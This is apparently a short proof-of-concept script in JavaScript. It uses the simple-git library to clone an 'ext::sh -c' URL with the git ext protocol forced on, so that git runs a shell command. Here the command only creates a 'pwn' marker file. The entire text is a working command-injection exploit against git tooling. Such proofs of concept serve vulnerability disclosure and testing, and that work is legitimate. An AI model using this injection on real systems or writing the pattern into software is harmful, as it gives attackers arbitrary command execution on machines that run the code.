const simpleGit = require('simple-git') 
const git2 = simpleGit() 
git2.clone('ext::sh -c touch% pwn% >&2', 'example-new-repo', ["-c", "protocol.ext.allow=always"]);
